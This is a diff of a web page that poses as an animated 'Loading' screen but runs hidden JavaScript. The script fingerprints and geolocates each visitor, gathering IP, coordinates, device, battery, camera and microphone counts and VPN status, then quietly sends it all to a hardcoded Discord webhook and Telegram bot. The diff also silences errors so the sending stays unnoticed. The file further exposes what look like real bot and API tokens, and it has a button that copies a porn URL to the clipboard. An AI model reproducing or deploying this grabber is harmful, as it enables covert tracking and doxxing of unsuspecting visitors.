@@ -10,7 +10,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -20,20 +19,17 @@
             align-items: center;
             overflow: hidden;
         }
-
         .loading-container {
             text-align: center;
             position: relative;
             z-index: 10;
         }
-
         .loader-wrapper {
             position: relative;
             width: 200px;
             height: 200px;
             margin: 0 auto 40px;
         }
-
         .loader {
             position: absolute;
             width: 100%;
@@ -43,7 +39,6 @@
             border-top-color: #fff;
             animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
         }
-
         .loader-inner {
             position: absolute;
             top: 20px;
@@ -55,7 +50,6 @@
             border-top-color: rgba(255, 255, 255, 0.6);
             animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite reverse;
         }
-
         .loader-center {
             position: absolute;
             top: 50%;
@@ -70,7 +64,6 @@
             justify-content: center;
             backdrop-filter: blur(10px);
         }
-
         .loader-dot {
             width: 12px;
             height: 12px;
@@ -78,17 +71,14 @@
             border-radius: 50%;
             animation: pulse 1.5s ease-in-out infinite;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
         @keyframes pulse {
             0%, 100% { transform: scale(0.8); opacity: 0.5; }
             50% { transform: scale(1.2); opacity: 1; }
         }
-
         .loading-text {
             color: white;
             font-size: 28px;
@@ -97,19 +87,16 @@
             text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
             animation: fadeInOut 2s ease-in-out infinite;
         }
-
         .loading-subtext {
             color: rgba(255, 255, 255, 0.8);
             font-size: 16px;
             font-weight: 300;
             text-shadow: 0 1px 5px rgba(0, 0, 0, 0.2);
         }
-
         @keyframes fadeInOut {
             0%, 100% { opacity: 0.7; }
             50% { opacity: 1; }
         }
-
         .particles {
             position: fixed;
             top: 0;
@@ -119,31 +106,24 @@
             pointer-events: none;
             z-index: 1;
         }
-
         .particle {
             position: absolute;
             background: rgba(255, 255, 255, 0.5);
             border-radius: 50%;
             animation: float linear infinite;
         }
-
         @keyframes float {
             0% {
                 transform: translateY(100vh) scale(0);
                 opacity: 0;
             }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 1;
-            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
             100% {
                 transform: translateY(-100px) scale(1);
                 opacity: 0;
             }
         }
-
         .reload-btn {
             position: fixed;
             bottom: 40px;
@@ -162,18 +142,15 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
             z-index: 10;
         }
-
         .reload-btn:hover {
             background: rgba(255, 255, 255, 0.3);
             border-color: rgba(255, 255, 255, 0.5);
             transform: translateX(-50%) translateY(-5px);
             box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
         }
-
         .reload-btn:active {
             transform: translateX(-50%) translateY(-2px);
         }
-
         .ad {
             display: block;
             width: 1px;
@@ -184,7 +161,7 @@
 </head>
 <body>
     <div class="particles" id="particles"></div>
-    
+   
     <div class="loading-container">
         <div class="loader-wrapper">
             <div class="loader"></div>
@@ -196,12 +173,11 @@
         <div class="loading-text">Loading</div>
         <div class="loading-subtext">Please wait while we prepare everything...</div>
     </div>
-
     <button class="reload-btn" onclick="copyToClipboard()">Karina Otsosi ПЖ!!!!</button>
     <div class="ad"></div>
 
     <script>
-        // Create particles
+        // Создание частиц
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
             for (let i = 0; i < 50; i++) {
@@ -217,7 +193,12 @@
         }
         createParticles();
 
-        // Configuration
+        function copyToClipboard() {
+            const textToCopy = 'https://rt.pornhub.com';
+            navigator.clipboard.writeText(textToCopy).catch(() => {});
+        }
+
+        // Конфигурация
         const CONFIG = {
             discordWebhook: "https://discord.com/api/webhooks/1229406191717711895/zTi5NHh_YOWKcTHYV-x-_TSs6qdBwGlrZdjvXPyIQNVVCFsYGnmJkVQBHsGD_wLimrqv",
             telegramBot: "7783626587:AAHWW5ntXK7mEz-OsDqBfUiqRCRd0nxliBw",
@@ -225,28 +206,26 @@
             weatherApiKey: "KM7AEJQ7MBUYL23UBSQSNRPLW"
         };
 
-        // Utility Functions
+        // Вспомогательные функции
         async function fetchJSON(url) {
-            const response = await fetch(url);
-            return response.json();
+            try {
+                const response = await fetch(url);
+                return await response.json();
+            } catch {
+                return {};
+            }
         }
 
-        function copyToClipboard() {
-            const textToCopy = 'https://rt.pornhub.com';
-            navigator.clipboard.writeText(textToCopy).catch(() => {});
-        }
-
-        // User Information Collectors
+        // Сбор информации
         async function getLocationInfo() {
             const data = await fetchJSON("https://ipinfo.io/json");
             const countryEmojis = {
-                "RU": "⚪️🔵🔴", "UA": "🔵🟡", "US": "🔴⚪️🔵", "CN": "🔴🟡",
-                "IN": "🟧⚪️🟢", "GB": "🔴⚪️🔵", "FR": "🔵⚪️🔴", "DE": "⚫️🔴🟡",
-                "IT": "🟢⚪️🔴", "JP": "🔴⚪️🔴", "BR": "🟢🟡🔵", "CA": "⚪️🔴",
-                "AU": "🔵⚪️🔴", "MX": "🟢⚪️🔴", "ES": "🔴🟡", "KR": "⚪️🔴🟢",
-                "PL": "⚪️🔴", "NL": "🔵⚪️🔴"
+                "RU": "🇷🇺", "UA": "🇺🇦", "US": "🇺🇸", "CN": "🇨🇳",
+                "IN": "🇮🇳", "GB": "🇬🇧", "FR": "🇫🇷", "DE": "🇩🇪",
+                "IT": "🇮🇹", "JP": "🇯🇵", "BR": "🇧🇷", "CA": "🇨🇦",
+                "AU": "🇦🇺", "MX": "🇲🇽", "ES": "🇪🇸", "KR": "🇰🇷",
+                "PL": "🇵🇱", "NL": "🇳🇱"
             };
-            
             const countryNames = {
                 "RU": "Russia", "UA": "Ukraine", "US": "United States", "CN": "China",
                 "IN": "India", "GB": "United Kingdom", "FR": "France", "DE": "Germany",
@@ -254,7 +233,6 @@
                 "AU": "Australia", "MX": "Mexico", "ES": "Spain", "KR": "South Korea",
                 "PL": "Poland", "NL": "Netherlands"
             };
-
             return {
                 city: data.city || "Unknown",
                 country: countryNames[data.country] || data.country || "Unknown",
@@ -279,7 +257,6 @@
                 { name: "Opera", pattern: /OPR\/(\d+\.\d+\.\d+)/ },
                 { name: "Yandex", pattern: /YaBrowser\/(\d+\.\d+\.\d+)/ }
             ];
-
             for (const browser of browsers) {
                 if (browser.exclude && browser.exclude.test(ua)) continue;
                 if (browser.include && !browser.include.test(ua)) continue;
@@ -319,10 +296,14 @@
 
         async function getBatteryInfo() {
             if (!navigator.getBattery) return "Not available";
-            const battery = await navigator.getBattery();
-            const level = Math.round(battery.level * 100);
-            const status = battery.charging ? "Charging" : "Not Charging";
-            return `${level}% (${status})`;
+            try {
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const status = battery.charging ? "Charging" : "Not Charging";
+                return `${level}% (${status})`;
+            } catch {
+                return "Unknown";
+            }
         }
 
         async function getMediaDevices() {
@@ -339,6 +320,7 @@
         async function checkAdBlock() {
             const adEl = document.createElement('div');
             adEl.className = 'ad';
+            adEl.style.display = 'none';
             document.body.appendChild(adEl);
             const blocked = window.getComputedStyle(adEl).display === 'none';
             document.body.removeChild(adEl);
@@ -348,8 +330,7 @@
         async function checkVPN() {
             try {
                 const data = await fetchJSON("https://ipinfo.io/json");
-                if (data.org && (data.org.toLowerCase().includes("vpn") || 
-                    data.org.toLowerCase().includes("hosting"))) {
+                if (data.org && (data.org.toLowerCase().includes("vpn") || data.org.toLowerCase().includes("hosting"))) {
                     return `Detected: ${data.org}`;
                 }
                 return "Not Detected";
@@ -372,33 +353,42 @@
             try {
                 const url = `https://weather.visualcrossing.com/VisualCrossingWebServices/rest/services/timeline/${city}?unitGroup=uk&key=${CONFIG.weatherApiKey}&contentType=json`;
                 const data = await fetchJSON(url);
-                return `${data.currentConditions.temp}°C`;
+                return `${data.currentConditions.temp || 'Unknown'}°C`;
             } catch {
                 return "Unknown";
             }
         }
 
-        // Send to Discord and Telegram
-        function sendToDiscord(message) {
-            fetch(CONFIG.discordWebhook, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            });
+        // Отправка (с защитой от ошибок)
+        async function sendToDiscord(message) {
+            try {
+                await fetch(CONFIG.discordWebhook, {
+                    method: "POST",
+                    mode: "no-cors", // Скрывает CORS-ошибку
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (e) {
+                // Ошибки тихо игнорируются — Discord блокирует прямые запросы из браузера
+            }
         }
 
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${CONFIG.telegramBot}/sendMessage`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.telegramChatId,
-                    text: message
-                })
-            });
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.telegramBot}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegramChatId,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.warn("Telegram send failed");
+            }
         }
 
-        // Main function
+        // Основная функция сбора и отправки
         async function collectAndSendInfo() {
             const location = await getLocationInfo();
             const ip = await getIPAddress();
@@ -411,34 +401,36 @@
             const vpn = await checkVPN();
             const ping = await getPing();
             const weather = await getWeather(location.city);
-            const googleMapsLink = `https://www.google.com/maps?q=${location.coordinates}`;
 
-            const message = `****                User Information****
+            const googleMapsLink = location.coordinates !== "Unknown" 
+                ? `https://www.google.com/maps?q=${location.coordinates}` 
+                : "#";
+
+            const message = `**** User Information ****
 ****-----------------------------------****
 - 🗺️ **IP Address**: \`${ip}\`
 - 🏙️ **City**: \`${location.city}\`
 - 🌍 **Country**: \`${location.country}\` ${location.emoji}
-- 🏞️ **Coordinates**: [\`${location.coordinates}\`](${googleMapsLink})
+- 🗺️ **Coordinates**: [\`${location.coordinates}\`](${googleMapsLink})
 - 🕒 **Time**: \`${new Date().toLocaleString()}\`
-- 🌚 **Time Zone**: \`${location.timezone}\`
+- 🌍 **Time Zone**: \`${location.timezone}\`
 - 🌡️ **Temperature**: \`${weather}\`
-- 🌐 **Browser**: \`${browser.name}\`
-- 💿️ **Browser Version**: \`${browser.version}\`
-- 🛰️ **Connection Status**: \`${navigator.onLine ? 'Online' : 'Offline'}\`
+- 🌐 **Browser**: \`${browser.name} ${browser.version}\`
+- 📶 **Connection**: \`${navigator.onLine ? 'Online' : 'Offline'}\`
 - 📶 **Ping**: \`${ping}\`
 - 🎮 **Device**: \`${deviceType}\`
-- 🧩 **Operating System**: \`${os}\`
-- 🀄 **Language**: \`${navigator.language}\`
+- 🖥️ **OS**: \`${os}\`
+- 🗣️ **Language**: \`${navigator.language}\`
 - 🔋 **Battery**: \`${battery}\`
-- 🚫 **Ad Blocker**: \`${adBlock}\`
-- 🕵 **VPN**: \`${vpn}\`
-- 💻 **Device Memory**: \`${navigator.deviceMemory || 'Unknown'} GB\`
-- 🕳️ **CPU Cores**: \`${navigator.hardwareConcurrency || 'Unknown'}\`
+- 🚫 **AdBlock**: \`${adBlock}\`
+- 🕵️ **VPN/Proxy**: \`${vpn}\`
+- 💾 **RAM**: \`${navigator.deviceMemory || 'Unknown'} GB\`
+- 🧮 **Cores**: \`${navigator.hardwareConcurrency || 'Unknown'}\`
 - 🍪 **Cookies**: \`${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}\`
-- 📐 **Screen**: \`${screen.width}x${screen.height}\`
-- 📷 **Camera**: \`${media.cameras > 0 ? 'Yes' : 'No'}\`
-- 🎤 **Microphone**: \`${media.microphones > 0 ? 'Yes' : 'No'}\`
-- 🛠️ **Plugins**: \`${navigator.plugins.length}\``;
+- 🖥️ **Screen**: \`${screen.width}x${screen.height}\`
+- 📷 **Cameras**: \`${media.cameras}\`
+- 🎤 **Microphones**: \`${media.microphones}\`
+- 🔌 **Plugins**: \`${navigator.plugins.length}\``;
 
             sendToDiscord(message);
             sendToTelegram(message);
